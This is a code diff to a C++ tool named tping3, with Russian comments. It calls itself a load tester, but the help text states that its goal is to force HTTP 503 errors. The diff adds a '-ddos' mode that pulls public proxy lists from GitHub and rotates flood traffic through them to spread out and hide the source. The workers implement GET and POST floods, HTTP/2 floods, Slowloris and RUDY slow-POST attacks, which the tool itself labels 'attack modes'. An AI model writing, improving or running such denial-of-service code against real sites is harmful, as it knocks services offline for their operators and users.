@@ -1,6 +1,6 @@
 // ============================================================================
-// tping3.cpp – HTTP/HTTPS load tester для получения 503 Service Unavailable
-// Справка: tping3 -help
+// tping3.cpp – HTTP/HTTPS нагрузочный тестер
+// Режимы: -dos (по умолчанию) | -ddos (через прокси)
 // ============================================================================
 
 #include <iostream>
@@ -45,12 +45,12 @@ int threads_count = 200;
 string user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0";
 vector<string> ua_list;
 vector<string> proxies;
+bool ddos_mode = false;
+mutex proxies_mutex;
 
-void sigint_handler(int) {
-    running = false;
-}
+void sigint_handler(int) { running = false; }
 
-// рандомная строка
+// ==================== УТИЛИТЫ ====================
 string rand_str(int len) {
     static const char alnum[] = "0123456789abcdefghijklmnopqrstuvwxyz";
     string s;
@@ -58,12 +58,65 @@ string rand_str(int len) {
     return s;
 }
 
-// callback для curl (отбрасываем данные)
-size_t write_cb(void*, size_t size, size_t nmemb, void*) {
-    return size * nmemb;
+size_t write_cb(void*, size_t size, size_t nmemb, void*) { return size * nmemb; }
+
+string get_random_proxy() {
+    lock_guard<mutex> lock(proxies_mutex);
+    if (proxies.empty()) return "";
+    return proxies[rand() % proxies.size()];
 }
 
-// создать curl с общими настройками
+vector<string> load_proxies_from_file(const string& filename) {
+    vector<string> result;
+    ifstream f(filename);
+    if (!f.is_open()) return result;
+    string line;
+    while (getline(f, line)) {
+        if (!line.empty() && line.find(':') != string::npos) result.push_back(line);
+    }
+    return result;
+}
+
+vector<string> load_proxies_from_github() {
+    vector<string> result;
+    vector<string> urls = {
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt"
+    };
+    for (const auto& url : urls) {
+        string cmd = "curl -s --max-time 10 \"" + url + "\" 2>/dev/null";
+        FILE* fp = popen(cmd.c_str(), "r");
+        if (!fp) continue;
+        char buf[512];
+        while (fgets(buf, sizeof(buf), fp)) {
+            string line = buf;
+            while (!line.empty() && (line.back() == '\n' || line.back() == '\r' || line.back() == ' '))
+                line.pop_back();
+            if (!line.empty() && line.find(':') != string::npos) result.push_back(line);
+        }
+        pclose(fp);
+    }
+    return result;
+}
+
+void load_proxies_smart() {
+    proxies = load_proxies_from_file("proxies.txt");
+    if (proxies.empty()) proxies = load_proxies_from_file("/usr/local/bin/proxies.txt");
+    if (proxies.empty()) proxies = load_proxies_from_file("./proxies.txt");
+    if (proxies.empty()) {
+        cerr << "[*] proxies.txt не найден, загружаю с GitHub...\n";
+        proxies = load_proxies_from_github();
+    }
+    if (proxies.empty()) {
+        cerr << "[-] Прокси не загружены. Режим -ddos отключён, работаю как -dos.\n";
+        ddos_mode = false;
+    } else {
+        cout << "[+] Загружено прокси: " << proxies.size() << "\n";
+    }
+}
+
+// ==================== CURL ====================
 CURL* make_curl() {
     CURL* curl = curl_easy_init();
     if (!curl) return nullptr;
@@ -71,7 +124,8 @@ CURL* make_curl() {
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 3L);
     curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 2L);
     curl_easy_setopt(curl, CURLOPT_FORBID_REUSE, 1L);
-    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
+    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+    curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 3L);
     curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
     if (use_https) {
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
@@ -80,10 +134,17 @@ CURL* make_curl() {
     string ua = user_agent;
     if (!ua_list.empty()) ua = ua_list[rand() % ua_list.size()];
     curl_easy_setopt(curl, CURLOPT_USERAGENT, ua.c_str());
+
+    if (ddos_mode) {
+        string proxy = get_random_proxy();
+        if (!proxy.empty()) {
+            curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
+            curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+        }
+    }
     return curl;
 }
 
-// обработка ответа
 void handle_response(CURLcode res, long code) {
     sent_requests++;
     if (res != CURLE_OK) {
@@ -97,46 +158,46 @@ void handle_response(CURLcode res, long code) {
     else code_other++;
 }
 
-// ==================== HTTP GET WORKER ====================
+// ==================== WORKERS ====================
 void worker_get() {
     CURL* curl = make_curl();
     if (!curl) return;
-    string url = target_url + "/" + rand_str(8) + "?" + rand_str(12);
-    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-
     while (running) {
-        string new_url = target_url + "/" + rand_str(8) + "?" + rand_str(12);
-        curl_easy_setopt(curl, CURLOPT_URL, new_url.c_str());
+        string url = target_url + "/" + rand_str(8) + "?" + rand_str(12);
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
         CURLcode res = curl_easy_perform(curl);
         long http_code = 0;
         curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
         handle_response(res, http_code);
+        if (ddos_mode) {
+            string proxy = get_random_proxy();
+            if (!proxy.empty()) curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
+        }
     }
     curl_easy_cleanup(curl);
 }
 
-// ==================== HTTP POST WORKER ====================
 void worker_post() {
     CURL* curl = make_curl();
     if (!curl) return;
-    string url = target_url + "/" + rand_str(8);
-    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
     curl_easy_setopt(curl, CURLOPT_POST, 1L);
-
     while (running) {
         string body = "data=" + rand_str(256);
+        curl_easy_setopt(curl, CURLOPT_URL, (target_url + "/" + rand_str(8)).c_str());
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
         curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)body.size());
         CURLcode res = curl_easy_perform(curl);
         long http_code = 0;
         curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
         handle_response(res, http_code);
-        curl_easy_setopt(curl, CURLOPT_URL, (target_url + "/" + rand_str(8)).c_str());
+        if (ddos_mode) {
+            string proxy = get_random_proxy();
+            if (!proxy.empty()) curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
+        }
     }
     curl_easy_cleanup(curl);
 }
 
-// ==================== HTTP/2 WORKER ====================
 void worker_http2() {
     CURL* curl = make_curl();
     if (!curl) return;
@@ -148,11 +209,14 @@ void worker_http2() {
         long http_code = 0;
         curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
         handle_response(res, http_code);
+        if (ddos_mode) {
+            string proxy = get_random_proxy();
+            if (!proxy.empty()) curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
+        }
     }
     curl_easy_cleanup(curl);
 }
 
-// ==================== SLOWLORIS WORKER ====================
 void worker_slowloris(const string& host, int port) {
     while (running) {
         int sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -161,13 +225,9 @@ void worker_slowloris(const string& host, int port) {
         dest.sin_family = AF_INET;
         dest.sin_port = htons(port);
         inet_pton(AF_INET, host.c_str(), &dest.sin_addr);
-        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
-            close(sock);
-            continue;
-        }
+        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) < 0) { close(sock); continue; }
         string req = "GET /" + rand_str(8) + " HTTP/1.1\r\nHost: " + host + "\r\n";
         send(sock, req.c_str(), req.size(), 0);
-        // держим соединение и шлём мелкие заголовки
         while (running) {
             string h = "X-a: " + rand_str(4) + "\r\n";
             if (send(sock, h.c_str(), h.size(), 0) <= 0) break;
@@ -177,7 +237,6 @@ void worker_slowloris(const string& host, int port) {
     }
 }
 
-// ==================== RUDY (Slow POST) ====================
 void worker_rudy(const string& host, int port) {
     while (running) {
         int sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -186,10 +245,7 @@ void worker_rudy(const string& host, int port) {
         dest.sin_family = AF_INET;
         dest.sin_port = htons(port);
         inet_pton(AF_INET, host.c_str(), &dest.sin_addr);
-        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
-            close(sock);
-            continue;
-        }
+        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) < 0) { close(sock); continue; }
         string req = "POST /" + rand_str(8) + " HTTP/1.1\r\nHost: " + host +
                      "\r\nContent-Length: 100000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n";
         send(sock, req.c_str(), req.size(), 0);
@@ -225,13 +281,13 @@ void stats_loop() {
 // ==================== ЗАПУСК ====================
 void tping3_run(const string& mode) {
     string host = target_url;
-    // выделим hostname из URL
     if (host.find("https://") == 0) host = host.substr(8);
     else if (host.find("http://") == 0) host = host.substr(7);
     if (host.find('/') != string::npos) host = host.substr(0, host.find('/'));
 
     cout << "\n[*] Target: " << target_url << " mode=" << mode
          << " threads=" << threads_count
+         << (ddos_mode ? (" [ddos via proxies: " + to_string(proxies.size()) + "]") : " [dos]")
          << (duration_sec ? (" duration=" + to_string(duration_sec) + "s") : " [infinite]")
          << "\n";
 
@@ -239,9 +295,9 @@ void tping3_run(const string& mode) {
     vector<thread> workers;
 
     for (int i = 0; i < threads_count; ++i) {
-        if (mode == "get")      workers.emplace_back(worker_get);
-        else if (mode == "post")workers.emplace_back(worker_post);
-        else if (mode == "http2")workers.emplace_back(worker_http2);
+        if (mode == "get") workers.emplace_back(worker_get);
+        else if (mode == "post") workers.emplace_back(worker_post);
+        else if (mode == "http2") workers.emplace_back(worker_http2);
         else if (mode == "slowloris") workers.emplace_back(worker_slowloris, host, target_port);
         else if (mode == "rudy") workers.emplace_back(worker_rudy, host, target_port);
         else if (mode == "mix") {
@@ -273,20 +329,19 @@ void tping3_run(const string& mode) {
 
 // ==================== СПРАВКА ====================
 void show_help() {
-    cout << "tping3 – HTTP/HTTPS load tester (цель: получить HTTP 503)\n";
-    cout << "Использование: tping3 -url <URL> -mode <mode> [опции]\n";
-    cout << "Примеры:\n";
-    cout << "  tping3 -url https://example.com -mode get -t 200 -d 120\n";
-    cout << "  tping3 -url https://example.com -mode mix -t 500 -d 300\n";
-    cout << "  tping3 -url https://example.com -mode slowloris -t 500 -d 120\n";
-    cout << "Режимы: get | post | http2 | slowloris | rudy | mix\n";
-    cout << "Опции:\n";
+    cout << "tping3 – HTTP/HTTPS нагрузочный тестер\n";
+    cout << "Использование: tping3 [-dos|-ddos] -url <URL> -mode <mode> [-t N] [-d SEC] [-ua FILE]\n";
+    cout << "Режимы:\n";
+    cout << "  -dos          отправка с локального IP (по умолчанию)\n";
+    cout << "  -ddos         распределённая отправка (proxies.txt или автозагрузка)\n";
+    cout << "Режимы атаки:\n";
+    cout << "  get | post | http2 | slowloris | rudy | mix\n";
+    cout << "Флаги:\n";
     cout << "  -url <URL>     целевой URL (с http:// или https://)\n";
-    cout << "  -mode <mode>   режим работы (по умолчанию get)\n";
-    cout << "  -t <N>         число потоков (по умолчанию 200, макс 512)\n";
-    cout << "  -d <SEC>       длительность в секундах (0 = бесконечно)\n";
-    cout << "  -ua <FILE>     файл с User-Agent (по одному на строку)\n";
-    cout << "  -help          показать справку\n";
+    cout << "  -mode <mode>   режим (по умолчанию get)\n";
+    cout << "  -t <N>         число потоков (1..512)\n";
+    cout << "  -d <SEC>       длительность в секундах\n";
+    cout << "  -ua <FILE>     список User-Agent (по одному на строку)\n";
 }
 
 // ==================== MAIN ====================
@@ -295,52 +350,36 @@ int main(int argc, char* argv[]) {
     srand(time(nullptr));
     curl_global_init(CURL_GLOBAL_ALL);
 
-    if (argc < 2) {
-        show_help();
-        return 0;
-    }
+    if (argc < 2) { show_help(); return 0; }
     string first = argv[1];
-    if (first == "-help" || first == "--help" || first == "-h") {
-        show_help();
-        return 0;
-    }
+    if (first == "-help" || first == "--help" || first == "-h") { show_help(); return 0; }
 
     string mode = "get";
     for (int i = 1; i < argc; ++i) {
         string arg = argv[i];
-        if (arg == "-url" && i + 1 < argc) {
-            target_url = argv[++i];
-        } else if (arg == "-mode" && i + 1 < argc) {
-            mode = argv[++i];
-        } else if (arg == "-t" && i + 1 < argc) {
+        if (arg == "-dos") ddos_mode = false;
+        else if (arg == "-ddos") ddos_mode = true;
+        else if (arg == "-url" && i + 1 < argc) target_url = argv[++i];
+        else if (arg == "-mode" && i + 1 < argc) mode = argv[++i];
+        else if (arg == "-t" && i + 1 < argc) {
             threads_count = stoi(argv[++i]);
             if (threads_count < 1) threads_count = 1;
             if (threads_count > 512) threads_count = 512;
-        } else if (arg == "-d" && i + 1 < argc) {
-            duration_sec = stoi(argv[++i]);
-        } else if (arg == "-ua" && i + 1 < argc) {
+        }
+        else if (arg == "-d" && i + 1 < argc) duration_sec = stoi(argv[++i]);
+        else if (arg == "-ua" && i + 1 < argc) {
             ifstream f(argv[++i]);
             string line;
             while (getline(f, line)) if (!line.empty()) ua_list.push_back(line);
         }
     }
 
-    if (target_url.empty()) {
-        show_help();
-        return 1;
-    }
+    if (ddos_mode) load_proxies_smart();
+    if (target_url.empty()) { show_help(); return 1; }
 
-    if (target_url.find("https://") == 0) {
-        use_https = true;
-        target_port = 443;
-    } else if (target_url.find("http://") == 0) {
-        use_https = false;
-        target_port = 80;
-    } else {
-        target_url = "http://" + target_url;
-        use_https = false;
-        target_port = 80;
-    }
+    if (target_url.find("https://") == 0) { use_https = true; target_port = 443; }
+    else if (target_url.find("http://") == 0) { use_https = false; target_port = 80; }
+    else { target_url = "http://" + target_url; use_https = false; target_port = 80; }
 
     tping3_run(mode);
 
